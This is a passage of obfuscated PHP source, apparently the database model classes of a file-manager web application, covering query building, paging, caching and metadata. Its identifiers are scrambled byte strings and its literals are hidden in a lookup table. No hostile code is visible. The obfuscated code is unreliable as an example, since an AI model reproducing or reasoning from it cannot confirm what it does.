$°ÈŠæüõ[420] ? $­×½Áä“ == $±šëÜ²à : $­×½Áä“ != $±šëÜ²à; case $°ÈŠæüõ[422]: $ôùñ‡±® = mb_strlen($­×½Áä“, $°ÈŠæüõ[423]); if (strpos($±šëÜ²à, $°ÈŠæüõ[50])) { list($íƒÎı“, $±Ğ”›İ) = explode($°ÈŠæüõ[50], $±šëÜ²à); return $ôùñ‡±® >= $íƒÎı“ && $ôùñ‡±® <= $±Ğ”›İ; } else { return $ôùñ‡±® == $±šëÜ²à; } case $°ÈŠæüõ[424]: list($¯ãÈ»ò, $ªõÕôø°) = explode($°ÈŠæüõ[50], $±šëÜ²à); if (!is_numeric($¯ãÈ»ò)) { $¯ãÈ»ò = strtotime($¯ãÈ»ò); } if (!is_numeric($ªõÕôø°)) { $ªõÕôø° = strtotime($ªõÕôø°); } return NOW_TIME >= $¯ãÈ»ò && NOW_TIME <= $ªõÕôø°; case $°ÈŠæüõ[425]: return in_array(get_client_ip(), explode($°ÈŠæüõ[50], $±šëÜ²à)); case $°ÈŠæüõ[426]: return !in_array(get_client_ip(), explode($°ÈŠæüõ[50], $±šëÜ²à)); case $°ÈŠæüõ[413]: default: return $this->regex($­×½Áä“, $±šëÜ²à); } } public function query($Å”ãèº¿, $ÀÀªŠ£Û = false) { $ŞÜÔù¾… =& $_SERVER[áäÒ½¯Ç]; if (!is_bool($ÀÀªŠ£Û) && !is_array($ÀÀªŠ£Û)) { $ÀÀªŠ£Û = func_get_args(); array_shift($ÀÀªŠ£Û); } $Å”ãèº¿ = str_replace(array($ŞÜÔù¾…[221], $ŞÜÔù¾…[427]), $ŞÜÔù¾…[53], $Å”ãèº¿); $Å”ãèº¿ = $this->parseSql($Å”ãèº¿, $ÀÀªŠ£Û); return $this->db->query($Å”ãèº¿); } public function execute($ˆÍ©×—„, $¤Ôøïû… = false) { if (!is_bool($¤Ôøïû…) && !is_array($¤Ôøïû…)) { $¤Ôøïû… = func_get_args(); array_shift($¤Ôøïû…); } $ˆÍ©×—„ = $this->parseSql($ˆÍ©×—„, $¤Ôøïû…); return $this->db->execute($ˆÍ©×—„); } protected function parseSql($èúºû’§, $Ö©–ø€Ò) { $˜ÙŞ°û… =& $_SERVER[áäÒ½¯Ç]; if (!0 === $Ö©–ø€Ò) { $Ñ›šõâ = $this->_parseOptions(); $èúºû’§ = $this->db->parseSql($èúºû’§, $Ñ›šõâ); } elseif (is_array($Ö©–ø€Ò)) { $Ö©–ø€Ò = array_map(array($this->db, $˜ÙŞ°û…[428]), $Ö©–ø€Ò); $èúºû’§ = vsprintf($èúºû’§, $Ö©–ø€Ò); } else { $èúºû’§ = strtr($èúºû’§, array($˜ÙŞ°û…[429] => $this->getTableName(), $˜ÙŞ°û…[430] => think_config($˜ÙŞ°û…[331]))); } $this->db->setModel($this->name); return $èúºû’§; } public function db($à‰ÇÎ—ñ = '', $‹„Ğä¯ª = '', $©Â€š˜Ï = array()) { $¬­Ò¨× =& $_SERVER[áäÒ½¯Ç]; if ($¬­Ò¨×[12] === $à‰ÇÎ—ñ && $this->db) { return $this->db; } static $¯æÅìŞÈ = array(); static $ÉëÕâ“¼ = array(); if (!isset($ÉëÕâ“¼[$à‰ÇÎ—ñ]) || isset($ÉëÕâ“¼[$à‰ÇÎ—ñ]) && $‹„Ğä¯ª && $¯æÅìŞÈ[$à‰ÇÎ—ñ] != $‹„Ğä¯ª) { if (!empty($‹„Ğä¯ª) && is_string($‹„Ğä¯ª) && !1 === strpos($‹„Ğä¯ª, $¬­Ò¨×[8])) { $‹„Ğä¯ª = think_config($‹„Ğä¯ª); } $à‰ÇÎ—ñ = think_guid($‹„Ğä¯ª); $ÉëÕâ“¼[$à‰ÇÎ—ñ] = Db::getInstance($‹„Ğä¯ª); } elseif (NULL === $‹„Ğä¯ª) { $ÉëÕâ“¼[$à‰ÇÎ—ñ]->close(); unset($ÉëÕâ“¼[$à‰ÇÎ—ñ]); return; } if (!empty($©Â€š˜Ï)) { if (is_string($©Â€š˜Ï)) { parse_str($©Â€š˜Ï, $©Â€š˜Ï); } foreach ($©Â€š˜Ï as $£èèçÒ => $çîŸ¼ú¿) { $this->setProperty($£èèçÒ, $çîŸ¼ú¿); } } $¯æÅìŞÈ[$à‰ÇÎ—ñ] = $‹„Ğä¯ª; $this->db = $ÉëÕâ“¼[$à‰ÇÎ—ñ]; $this->_after_db(); if (!empty($this->name) && $this->autoCheckFields) { $this->_checkTableInfo(); } return $this; } protected function _after_db() { } public function getModelName() { if (empty($this->name)) { $§†û·ìó = get_class($this); if ($§†û·ìó == $_SERVER[áäÒ½¯Ç][431]) { return $this->name; } $this->name = substr($§†û·ìó, 0, -5); } return $this->name; } public function getTableName() { $¿ƒèùÚı =& $_SERVER[áäÒ½¯Ç]; if (empty($this->trueTableName)) { $Ô‰¤¹ş¹ = !empty($this->tablePrefix) ? $this->tablePrefix : $¿ƒèùÚı[12]; if (!empty($this->tableName)) { $Ô‰¤¹ş¹ .= $this->tableName; } else { $Ô‰¤¹ş¹ .= think_parse_name($this->name); } $this->trueTableName = strtolower($Ô‰¤¹ş¹); } return (!empty($this->dbName) ? $this->dbName . $¿ƒèùÚı[10] : $¿ƒèùÚı[12]) . $this->trueTableName; } public function startTrans() { $this->commit(); $this->db->startTrans(); return; } public function commit() { return $this->db->commit(); } public function rollback() { return $this->db->rollback(); } public function getError() { return $this->error; } public function getDbError() { return $this->db->getError(); } public function getLastInsID() { return $this->db->getLastInsID(); } public function getLastSql() { return $this->db->getLastSql($this->name); } public function _sql() { return $this->getLastSql(); } public function getPk() { $å‚Î‰¢¹ =& $_SERVER[áäÒ½¯Ç]; return isset($this->fields[$å‚Î‰¢¹[338]]) ? $this->fields[$å‚Î‰¢¹[338]] : $this->pk; } public function getDbFields() { $¹¸Ô’³´ =& $_SERVER[áäÒ½¯Ç]; if (isset($this->options[$¹¸Ô’³´[367]])) { $¸Âß¹¨ = $this->db->getFields($this->options[$¹¸Ô’³´[367]]); return $¸Âß¹¨ ? array_keys($¸Âß¹¨) : !1; } if ($this->fields) { $¸Âß¹¨ = $this->fields; unset($¸Âß¹¨[$¹¸Ô’³´[337]], $¸Âß¹¨[$¹¸Ô’³´[338]], $¸Âß¹¨[$¹¸Ô’³´[339]], $¸Âß¹¨[$¹¸Ô’³´[336]]); return $¸Âß¹¨; } return !1; } public function data($îÖå«È© = '') { $üÆ£ÍÊë =& $_SERVER[áäÒ½¯Ç]; if ($üÆ£ÍÊë[12] === $îÖå«È© && !empty($this->data)) { return $this->data; } if (is_object($îÖå«È©)) { $îÖå«È© = get_object_vars($îÖå«È©); } elseif (is_string($îÖå«È©)) { parse_str($îÖå«È©, $îÖå«È©); } elseif (!is_array($îÖå«È©)) { think_exception(think_lang($üÆ£ÍÊë[359])); } $this->data = $îÖå«È©; return $this; } public function join($ÒÒòÃš) { $ˆğ‹æœÃ =& $_SERVER[áäÒ½¯Ç]; if (is_array($ÒÒòÃš)) { $this->options[$ˆğ‹æœÃ[370]] = $ÒÒòÃš; } elseif (!empty($ÒÒòÃš)) { $this->options[$ˆğ‹æœÃ[370]][] = $ÒÒòÃš; } return $this; } public function union($•ˆş¿÷Œ, $´Åà­¾ü = false) { $îÉ°”˜ =& $_SERVER[áäÒ½¯Ç]; if (empty($•ˆş¿÷Œ)) { return $this; } if ($´Åà­¾ü) { $this->options[$îÉ°”˜[432]][$îÉ°”˜[433]] = !0; } if (is_object($•ˆş¿÷Œ)) { $•ˆş¿÷Œ = get_object_vars($•ˆş¿÷Œ); } if (is_string($•ˆş¿÷Œ)) { $ß÷Úåóş = $•ˆş¿÷Œ; } elseif (is_array($•ˆş¿÷Œ)) { if (isset($•ˆş¿÷Œ[0])) { $this->options[$îÉ°”˜[432]] = array_merge($this->options[$îÉ°”˜[432]], $•ˆş¿÷Œ); return $this; } else { $ß÷Úåóş = $•ˆş¿÷Œ; } } else { think_exception(think_lang($îÉ°”˜[359])); } $this->options[$îÉ°”˜[432]][] = $ß÷Úåóş; return $this; } public function cache($á†’Şêé = true, $™”Ú½ª˜ = null, $•Ò¹ô©¬ = '') { $²Æ¼ŞüÜ =& $_SERVER[áäÒ½¯Ç]; if (!1 !== $á†’Şêé) { $this->options[$²Æ¼ŞüÜ[434]] = array($²Æ¼ŞüÜ[95] => $á†’Şêé, $²Æ¼ŞüÜ[424] => $™”Ú½ª˜, $²Æ¼ŞüÜ[33] => $•Ò¹ô©¬); } return $this; } public function field($Ëôì­øĞ, $Ş›Ïë¨à = false) { $ñğÍË‹ =& $_SERVER[áäÒ½¯Ç]; if (!0 === $Ëôì­øĞ) { $×ìã€¯÷ = $this->getDbFields(); $Ëôì­øĞ = $×ìã€¯÷ ? $×ìã€¯÷ : $ñğÍË‹[231]; } elseif ($Ş›Ïë¨à) { if (is_string($Ëôì­øĞ)) { $Ëôì­øĞ = explode($ñğÍË‹[50], $Ëôì­øĞ); } $×ìã€¯÷ = $this->getDbFields(); $Ëôì­øĞ = $×ìã€¯÷ ? array_diff($×ìã€¯÷, $Ëôì­øĞ) : $Ëôì­øĞ; } $this->options[$ñğÍË‹[361]] = $Ëôì­øĞ; return $this; } public function scope($ƒ¼İ¼‡ = '', $³ù‘é´‹ = NULL) { $´è£‚³Õ =& $_SERVER[áäÒ½¯Ç]; if ($´è£‚³Õ[12] === $ƒ¼İ¼‡) { if (isset($this->_scope[$´è£‚³Õ[37]])) { $ÓÆæ¹œ† = $this->_scope[$´è£‚³Õ[37]]; } else { return $this; } } elseif (is_string($ƒ¼İ¼‡)) { $îñ×î€´ = explode($´è£‚³Õ[50], $ƒ¼İ¼‡); $ÓÆæ¹œ† = array(); foreach ($îñ×î€´ as $©æ”¡ãç) { if (!isset($this->_scope[$©æ”¡ãç])) { continue; } $ÓÆæ¹œ† = array_merge($ÓÆæ¹œ†, $this->_scope[$©æ”¡ãç]); } if (!empty($³ù‘é´‹) && is_array($³ù‘é´‹)) { $ÓÆæ¹œ† = array_merge($ÓÆæ¹œ†, $³ù‘é´‹); } } elseif (is_array($ƒ¼İ¼‡)) { $ÓÆæ¹œ† = $ƒ¼İ¼‡; } if (is_array($ÓÆæ¹œ†) && !empty($ÓÆæ¹œ†)) { $this->options = array_merge($this->options, array_change_key_case($ÓÆæ¹œ†)); } return $this; } public function where($…ƒÂÂĞ, $×¤’¤úë = null) { $¼–ıÍÏ÷ =& $_SERVER[áäÒ½¯Ç]; if (!is_null($×¤’¤úë) && is_string($…ƒÂÂĞ)) { if (!is_array($×¤’¤úë)) { $×¤’¤úë = func_get_args(); array_shift($×¤’¤úë); } $×¤’¤úë = array_map(array($this->db, $¼–ıÍÏ÷[428]), $×¤’¤úë); $…ƒÂÂĞ = vsprintf($…ƒÂÂĞ, $×¤’¤úë); } elseif (is_object($…ƒÂÂĞ)) { $…ƒÂÂĞ = get_object_vars($…ƒÂÂĞ); } elseif (is_array($…ƒÂÂĞ)) { foreach ($…ƒÂÂĞ as $ªîÉµöÙ => $ü°¯ßôà) { if ((is_numeric($ªîÉµöÙ) || !$ªîÉµöÙ) && is_string($ü°¯ßôà)) { if (strpos($ü°¯ßôà, $¼–ıÍÏ÷[435]) === 0) { continue; } think_trace($¼–ıÍÏ÷[436], $¼–ıÍÏ÷[12], $¼–ıÍÏ÷[49]); die; } } } if (is_string($…ƒÂÂĞ) && $¼–ıÍÏ÷[12] != $…ƒÂÂĞ) { $§§®‹¡Ú = array(); $§§®‹¡Ú[$¼–ıÍÏ÷[437]] = $…ƒÂÂĞ; $…ƒÂÂĞ = $§§®‹¡Ú; } if (isset($this->options[$¼–ıÍÏ÷[363]])) { $this->options[$¼–ıÍÏ÷[363]] = array_merge($this->options[$¼–ıÍÏ÷[363]], $…ƒÂÂĞ); } else { $this->options[$¼–ıÍÏ÷[363]] = $…ƒÂÂĞ; } return $this; } public function limit($“óØšÆú, $Í›å‚ƒ™ = null) { $”Ïé‡ü =& $_SERVER[áäÒ½¯Ç]; $this->options[$”Ïé‡ü[378]] = is_null($Í›å‚ƒ™) ? $“óØšÆú : $“óØšÆú . $”Ïé‡ü[50] . $Í›å‚ƒ™; return $this; } public function page($ª¿ä¡üù, $êƒÉ³ = null) { $Öê‰‹ £ =& $_SERVER[áäÒ½¯Ç]; $this->options[$Öê‰‹ £[438]] = is_null($êƒÉ³) ? $ª¿ä¡üù : $ª¿ä¡üù . $Öê‰‹ £[50] . $êƒÉ³; return $this; } public function comment($Â×…ä‰Í) { $this->options[$_SERVER[áäÒ½¯Ç][439]] = $Â×…ä‰Í; return $this; } public function setProperty($œåÁÄ”ã, $÷ß›Öï) { if (property_exists($this, $œåÁÄ”ã)) { $this->{$œåÁÄ”ã} = $÷ß›Öï; } return $this; } } class ModelBase extends Model { const SQL_WHERE_IN_CHUNK = 2000; protected $dataAuto = array(array("\155\x6f\144\x69\146\171\x54\x69\155\145", "\164\x69\155\145", "\x69\156\x73\145\162\x74\x2c\x75\160\144\141\164\x65", "\146\165\x6e\143\x74\x69\x6f\x6e"), array("\143\x72\145\141\164\x65\124\151\155\145", "\164\x69\x6d\145", "\x69\156\x73\x65\x72\164", "\146\165\x6e\143\164\151\x6f\156")); public function setDataAuto($¨ÍíÊ¿³) { $this->dataAuto = $¨ÍíÊ¿³; } public function __construct($“­Ôñ¬ß = '', $Õ»™ìœ = '', $¤Ÿ«µìŸ = '') { parent::__construct($“­Ôñ¬ß, $Õ»™ìœ, $¤Ÿ«µìŸ); } protected $tableMeta = array(); protected function _beforeInsert(&$àşÀ¸Åğ, $ö…ü–Ÿ¡) { $¶Üæ¬Ú¹ =& $_SERVER[áäÒ½¯Ç]; if (!$this->checkDataAutoHas($¶Üæ¬Ú¹[440])) { return; } $this->dataBeforeFilter($àşÀ¸Åğ, $¶Üæ¬Ú¹[440]); } protected function _beforeUpdate(&$²ì·û¥, $†É¡¬Î) { $ûÒ¹ëÑ =& $_SERVER[áäÒ½¯Ç]; if (!$this->checkDataAutoHas($ûÒ¹ëÑ[441])) { return; } $this->dataBeforeFilter($²ì·û¥, $ûÒ¹ëÑ[441]); } protected function _afterSelect(&$€µ°¢ş, $¬ĞÖÀ€) { if (!is_array($€µ°¢ş)) { return; } if (!$this->checkDataAutoHas($_SERVER[áäÒ½¯Ç][442])) { return; } foreach ($€µ°¢ş as &$À–²Â“€) { $this->dataAfterFilter($À–²Â“€); } unset($À–²Â“€); } protected function _afterFind(&$Ü¥±Èüá, $¬éÒÀ) { if (!is_array($Ü¥±Èüá)) { return; } if (!$this->checkDataAutoHas($_SERVER[áäÒ½¯Ç][442])) { return; } $this->dataAfterFilter($Ü¥±Èüá); } public static function textEncode($à¤Á”æƒ) { if (!$à¤Á”æƒ) { return $à¤Á”æƒ; } $åÀ·şá = json_encode($à¤Á”æƒ); $åÀ·şá = preg_replace_callback($_SERVER[áäÒ½¯Ç][443], function ($çµÆé‚) { return addslashes($çµÆé‚[0]); }, $åÀ·şá); return json_decode($åÀ·şá); } public static function textDecode($ö¶â§‡) { $ÀÎçú¯ã =& $_SERVER[áäÒ½¯Ç]; if (!$ö¶â§‡) { return $ö¶â§‡; } $ÃÉÜŞùö = json_encode($ö¶â§‡); $ÃÉÜŞùö = preg_replace_callback($ÀÎçú¯ã[444], function ($±ÒÆªç‹) { return $_SERVER[áäÒ½¯Ç][98]; }, $ÃÉÜŞùö); return json_decode($ÃÉÜŞùö); } public function setAutoIncrement($©ûî…£î) { $¥ú£…ü­ = array($this->getPk() => $©ûî…£î); $¬®Ç÷“ë = $this->data($¥ú£…ü­)->add(); if ($¬®Ç÷“ë) { $this->delete($¬®Ç÷“ë); } } public function getAutoIncrement() { $ÜíÜšî‰ = $this->getTableName(); $Çöû…²ğ = $this->max($this->getPk()); $Ñä‡“¿ = $this->query("\x73\x68\157\x77\x20\x74\x61\142\x6c\145\x20\163\164\x61\x74\165\163\40\167\x68\x65\x72\x65\40\x4e\x61\155\x65\75\x27{$ÜíÜšî‰}\x27"); $“ãä–Ò– = $Ñä‡“¿[0][$_SERVER[áäÒ½¯Ç][445]]; $ãŠù¹Õ¢ = max($Çöû…²ğ, $“ãä–Ò–); return $ãŠù¹Õ¢; } protected function _callBefore($ŞòË¤øò, $Ğ‚™éöİ) { return $this->cacheCallCheck($ŞòË¤øò, $Ğ‚™éöİ, !1); } protected function _callAfter($½¿­†åÀ, $ŸÏ‰åå¶) { return $this->cacheCallCheck($½¿­†åÀ, $ŸÏ‰åå¶, !0); } protected function cacheFunctionAlias($§ëŠúÙÖ) { return !1; } public function cacheMemory() { return $this->cache(null, 0); } protected function cacheCallCheck($¬‡µãÎº, $ÚèèÀÙÅ, $¿¬ß›©¾ = false) { $îé¯•ĞÀ =& $_SERVER[áäÒ½¯Ç]; $Ç³º×­ˆ = $this->cacheFunctionAlias($ÚèèÀÙÅ); if (!$Ç³º×­ˆ) { return; } foreach ($Ç³º×­ˆ as $›ôõñÈ => $«äÅ©†ù) { $Ñú îÖ = $«äÅ©†ù[0]; $µÓøá‡å = explode($îé¯•ĞÀ[50], $«äÅ©†ù[1]); $İª©õØı = isset($«äÅ©†ù[2]) ? $«äÅ©†ù[2] : $îé¯•ĞÀ[12]; if ($¬‡µãÎº == $›ôõñÈ) { return $this->cacheFunctionGet($›ôõñÈ, $Ñú îÖ, $İª©õØı); } if ($¿¬ß›©¾ && in_array($¬‡µãÎº, $µÓøá‡å)) { $this->cacheFunctionClear($›ôõñÈ, $Ñú îÖ, $İª©õØı); } } } public function cacheFunctionGet($û¨İõŒ, $–‡ÕúÈş, $•ûË¥Á© = '') { $ÇÁºõš® =& $_SERVER[áäÒ½¯Ç]; $İ›úõÌá = $this->cacheKeyMake($û¨İõŒ, $–‡ÕúÈş, $•ûË¥Á©); $È™İÙèö = Cache::get($İ›úõÌá); if (!is_array($È™İÙèö)) { if (method_exists($this, $ÇÁºõš®[351] . $û¨İõŒ)) { $û¨İõŒ = $ÇÁºõš®[351] . $û¨İõŒ; } $È™İÙèö = call_user_func_array(array($this, $û¨İõŒ), array($–‡ÕúÈş, !0)); Cache::set($İ›úõÌá, $È™İÙèö); } return $È™İÙèö; } public function cacheFunctionClear($÷€ëê, $İ”õığã, $ï—«›’‚ = '') { $íûÙ‹ıô = $İ”õığã; if (!is_array($İ”õığã)) { $íûÙ‹ıô = array($İ”õığã); } foreach ($íûÙ‹ıô as $¥ˆšµ“—) { $‡îéòÂË = $this->cacheKeyMake($÷€ëê, $¥ˆšµ“—, $ï—«›’‚); Cache::remove($‡îéòÂË); } } public function cacheKeyMake($Ô„ô×™, $ÅÍÌû±Ş, $¤Ù‰îÍ¶) { $¨ÀÙÒÅ“ =& $_SERVER[áäÒ½¯Ç]; if ($¤Ù‰îÍ¶) { $ÅÍÌû±Ş = $ÅÍÌû±Ş . $¨ÀÙÒÅ“[446] . $¤Ù‰îÍ¶; } return get_class($this) . $¨ÀÙÒÅ“[11] . $Ô„ô×™ . $¨ÀÙÒÅ“[447] . $ÅÍÌû±Ş; } protected function selectPageReset() { $­Îßö°Ö =& $_SERVER[áäÒ½¯Ç]; if (isset($GLOBALS[$­Îßö°Ö[448]])) { return; } $GLOBALS[$­Îßö°Ö[448]] = isset($GLOBALS[$­Îßö°Ö[7]][$­Îßö°Ö[449]]) ? $GLOBALS[$­Îßö°Ö[7]][$­Îßö°Ö[449]] : !1; $GLOBALS[$­Îßö°Ö[450]] = isset($GLOBALS[$­Îßö°Ö[7]][$­Îßö°Ö[438]]) ? $GLOBALS[$­Îßö°Ö[7]][$­Îßö°Ö[438]] : !1; $GLOBALS[$­Îßö°Ö[7]][$­Îßö°Ö[449]] = !1; $GLOBALS[$­Îßö°Ö[7]][$­Îßö°Ö[438]] = !1; } protected function selectPageRestore() { $ÍÎ®±ƒ— =& $_SERVER[áäÒ½¯Ç]; if (!isset($GLOBALS[$ÍÎ®±ƒ—[448]])) { return; } $GLOBALS[$ÍÎ®±ƒ—[7]][$ÍÎ®±ƒ—[449]] = $GLOBALS[$ÍÎ®±ƒ—[448]]; $GLOBALS[$ÍÎ®±ƒ—[7]][$ÍÎ®±ƒ—[438]] = $GLOBALS[$ÍÎ®±ƒ—[450]]; if ($GLOBALS[$ÍÎ®±ƒ—[7]][$ÍÎ®±ƒ—[449]] === !1) { unset($GLOBALS[$ÍÎ®±ƒ—[7]][$ÍÎ®±ƒ—[449]]); } if ($GLOBALS[$ÍÎ®±ƒ—[7]][$ÍÎ®±ƒ—[438]] === !1) { unset($GLOBALS[$ÍÎ®±ƒ—[7]][$ÍÎ®±ƒ—[438]]); } unset($GLOBALS[$ÍÎ®±ƒ—[448]]); unset($GLOBALS[$ÍÎ®±ƒ—[450]]); } protected function selectPage($ÆÙ÷œÀİ = 200, $¼ÛƒŒ° = 1) { $É…³ §÷ =& $_SERVER[áäÒ½¯Ç]; global $in; $ª´®£ = $this->optionsValue(); $äŒŒ¡öí = 50000; $ÆÙ÷œÀİ = isset($in[$É…³ §÷[449]]) && $in[$É…³ §÷[449]] ? $in[$É…³ §÷[449]] : $ÆÙ÷œÀİ; if ($ÆÙ÷œÀİ === -1) { $in[$É…³ §÷[449]] = !1; $äŒŒ¡öí = 100000000; $ÆÙ÷œÀİ = $äŒŒ¡öí; } $œ×Ş´Ş = $ª´®£; $œ×Ş´Ş[$É…³ §÷[451]] = array(); $ÆÙ÷œÀİ = intval($ÆÙ÷œÀİ); $ÆÙ÷œÀİ = $ÆÙ÷œÀİ <= 5 ? 5 : ($ÆÙ÷œÀİ >= $äŒŒ¡öí ? $äŒŒ¡öí : $ÆÙ÷œÀİ); $¼ÛƒŒ° = intval(isset($in[$É…³ §÷[438]]) && $in[$É…³ §÷[438]] ? $in[$É…³ §÷[438]] : $¼ÛƒŒ°); $¼ÛƒŒ° = $¼ÛƒŒ° <= 1 ? 1 : $¼ÛƒŒ°; $Ç”Ï±Ä× = array(); $ÖÃÛ³ Ş = 1; if ($¼ÛƒŒ° == 1 && $ÖÃÛ³ Ş) { $this->optionsValue($ª´®£); $Ç”Ï±Ä× = $this->page($¼ÛƒŒ°, $ÆÙ÷œÀİ)->select(); $ÊøÈ§­á = is_array($Ç”Ï±Ä×) ? count($Ç”Ï±Ä×) : 0; if ($ÊøÈ§­á < $ÆÙ÷œÀİ) { $Ó’–»¬§ = 1; } else { $this->optionsValue($œ×Ş´Ş); $ÊøÈ§­á = intval($this->count()); $Ó’–»¬§ = ceil($ÊøÈ§­á / $ÆÙ÷œÀİ); } } else { $this->optionsValue($œ×Ş´Ş); $ÊøÈ§­á = intval($this->count()); $Ó’–»¬§ = ceil($ÊøÈ§­á / $ÆÙ÷œÀİ); $¼ÛƒŒ° = $¼ÛƒŒ° >= $Ó’–»¬§ ? $Ó’–»¬§ : $¼ÛƒŒ°; $this->optionsValue($ª´®£); $Ç”Ï±Ä× = $this->page($¼ÛƒŒ°, $ÆÙ÷œÀİ)->select(); } if (!is_array($Ç”Ï±Ä×)) { $Ç”Ï±Ä× = array(); } if ($Ó’–»¬§ == 1) { $ÊøÈ§­á = count($Ç”Ï±Ä×); } $³´³Á½ = array($É…³ §÷[452] => array($É…³ §÷[453] => $ÊøÈ§­á, $É…³ §÷[449] => $ÆÙ÷œÀİ, $É…³ §÷[438] => $¼ÛƒŒ°, $É…³ §÷[454] => $Ó’–»¬§), $É…³ §÷[455] => $Ç”Ï±Ä×); return $³´³Á½; } protected function checkLength($Øñ°ğóˆ, $»Ñı§ÉÒ = 0, $àÀ³ì£» = '') { $êûŠ±©Á =& $_SERVER[áäÒ½¯Ç]; $»Ñı§ÉÒ = $»Ñı§ÉÒ ? $»Ñı§ÉÒ : 65536; if (!$Øñ°ğóˆ || strlen($Øñ°ğóˆ) < $»Ñı§ÉÒ) { return; } $àÀ³ì£» = $àÀ³ì£» ? $àÀ³ì£» . $êûŠ±©Á[74] : $êûŠ±©Á[12]; show_json($àÀ³ì£» . LNG($êûŠ±©Á[456]) . "\x28{$»Ñı§ÉÒ}\51", !1); } protected function metaSet($äòØ¬êà, $ÆøˆÌ¿¾ = null, $› ²Á¶ = null) { $Š·”ÉÚú =& $_SERVER[áäÒ½¯Ç]; if (!$this->tableMeta || !$äòØ¬êà) { return !1; } $´úã×ü = $this->tableMeta[$Š·”ÉÚú[457]]; $„Ş’°„Ğ = $this->tableMeta[$Š·”ÉÚú[458]]; $ş¯¹ğáø = Model($„Ş’°„Ğ); $Ä‰­ÉÂ† = array($´úã×ü => $äòØ¬êà, $Š·”ÉÚú[459] => $ÆøˆÌ¿¾); if (is_null($ÆøˆÌ¿¾)) { return $ş¯¹ğáø->where(array($´úã×ü => $äòØ¬êà))->delete(); } if (is_null($› ²Á¶) && is_string($ÆøˆÌ¿¾)) { return $ş¯¹ğáø->where($Ä‰­ÉÂ†)->delete(); } $·Ì¦Õà‚ = is_array($ÆøˆÌ¿¾) ? $ÆøˆÌ¿¾ : array(); if (is_string($ÆøˆÌ¿¾)) { $·Ì¦Õà‚[$ÆøˆÌ¿¾] = $› ²Á¶; } $‰ß¦±–â = array(); foreach ($·Ì¦Õà‚ as $¶éã‚• => $¢…ßÀÓ•) { if (is_null($¢…ßÀÓ•) && is_string($¶éã‚•)) { $ş¯¹ğáø->where(array($´úã×ü => $äòØ¬êà, $Š·”ÉÚú[459] => $¶éã‚•))->delete(); continue; } $this->checkLength($¢…ßÀÓ•, !1, $„Ş’°„Ğ . $Š·”ÉÚú[4] . $¶éã‚•); $‰ß¦±–â[] = array($´úã×ü => $äòØ¬êà, $Š·”ÉÚú[95] => $¶éã‚•, $Š·”ÉÚú[460] => $¢…ßÀÓ•); } $ÀõÍ†Ï¿ = $Š·”ÉÚú[461] . $„Ş’°„Ğ; CacheLock::lock($ÀõÍ†Ï¿); $ş¯¹ğáø->where(array($´úã×ü => $äòØ¬êà))->addAll($‰ß¦±–â, array(), !0); CacheLock::unlock($ÀõÍ†Ï¿); return !0; } public function metaGet($€÷Ş³İ•, $†í¹­êÄ = false) { $¾›°À¢ğ =& $_SERVER[áäÒ½¯Ç]; if (!$this->tableMeta) { return array(); } $Öù…Ó“æ = $this->tableMeta[$¾›°À¢ğ[457]]; $Êó™ß¨ = Model($this->tableMeta[$¾›°À¢ğ[458]]); if ($†í¹­êÄ) { $óş¹²Éí = array($Öù…Ó“æ => $€÷Ş³İ•, $¾›°À¢ğ[95] => $†í¹­êÄ); return $Êó™ß¨->where($óş¹²Éí)->getField($¾›°À¢ğ[460]); } $óş¹²Éí = array($Öù…Ó“æ => $€÷Ş³İ•); $¦Ø«©Éê = $Êó™ß¨->field($¾›°À¢ğ[462])->where($óş¹²Éí)->select(); $¦Ø«©Éê = array_to_keyvalue($¦Ø«©Éê, $¾›°À¢ğ[95], $¾›°À¢ğ[460]); return $¦Ø«©Éê; } private function checkDataAutoHas($İ­’ò¨) { if (!is_array($this->dataAuto) || count($this->dataAuto) == 0) { return !1; } foreach ($this->dataAuto as $—ñî‹­Ç) { if (in_array($İ­’ò¨, explode($_SERVER[áäÒ½¯Ç][50], $—ñî‹­Ç[2]))) { return !0; } } return !1; } private function dataBeforeFilter(&$õ“±’‘», $¤¢¸ú¬) { $‹¶‰ëùŸ =& $_SERVER[áäÒ½¯Ç]; if (!is_array($õ“±’‘»)) { return; } foreach ($this->dataAuto as $ˆíñ´—±) { $¯ÅœĞù = $ˆíñ´—±[0]; if (!in_array($¤¢¸ú¬, explode($‹¶‰ëùŸ[50], $ˆíñ´—±[2]))) { continue; } switch (trim($ˆíñ´—±[3])) { case $‹¶‰ëùŸ[406]: case $‹¶‰ëùŸ[407]: $Œ ôüñÆ = $ˆíñ´—±[1]; $û—ˆ£  = isset($ˆíñ´—±[4]) ? (array) $ˆíñ´—±[4] : array(); if ($Œ ôüñÆ == $‹¶‰ëùŸ[205] && array_key_exists($¯ÅœĞù, $õ“±’‘»)) { if (!$õ“±’‘»[$¯ÅœĞù]) { unset($õ“±’‘»[$¯ÅœĞù]); } break; } if (isset($õ“±’‘»[$¯ÅœĞù])) { array_unshift($û—ˆ£ , $õ“±’‘»[$¯ÅœĞù]); } if ($‹¶‰ëùŸ[406] == $ˆíñ´—±[3]) { $õ“±’‘»[$¯ÅœĞù] = call_user_func_array($Œ ôüñÆ, $û—ˆ£ ); } else { $õ“±’‘»[$¯ÅœĞù] = call_user_func_array(array(&$this, $Œ ôüñÆ), $û—ˆ£ ); } break; case $‹¶‰ëùŸ[358]: if (isset($õ“±’‘»[$¯ÅœĞù]) && $õ“±’‘»[$¯ÅœĞù]) { $õ“±’‘»[$¯ÅœĞù] = call_user_func_array(array(&$this, $ˆíñ´—±[1]), array($õ“±’‘»[$¯ÅœĞù])); } break; case $‹¶‰ëùŸ[361]: $õ“±’‘»[$¯ÅœĞù] = $õ“±’‘»[$ˆíñ´—±[1]]; break; case $‹¶‰ëùŸ[379]: if (isset($õ“±’‘»[$¯ÅœĞù]) && !is_string($õ“±’‘»[$¯ÅœĞù])) { $õ“±’‘»[$¯ÅœĞù] = json_encode_force($õ“±’‘»[$¯ÅœĞù]); $õ“±’‘»[$¯ÅœĞù] = self::textEncode($õ“±’‘»[$¯ÅœĞù]); } break; case $‹¶‰ëùŸ[408]: if ($õ“±’‘»[$¯ÅœĞù] === $‹¶‰ëùŸ[12]) { unset($õ“±’‘»[$¯ÅœĞù]); } break; case $‹¶‰ëùŸ[409]: $õ“±’‘»[$¯ÅœĞù] = $ˆíñ´—±[1]; default: break; } } if ($¤¢¸ú¬ == $‹¶‰ëùŸ[440]) { $øäŠ‹¾ = strtolower($this->db->getDbType()); if (strpos($øäŠ‹¾, $‹¶‰ëùŸ[13]) !== 0) { return; } $€´¥‰‘» = $this->field(!0)->fields; $›äÌ¹ş = $€´¥‰‘»[$‹¶‰ëùŸ[339]]; if 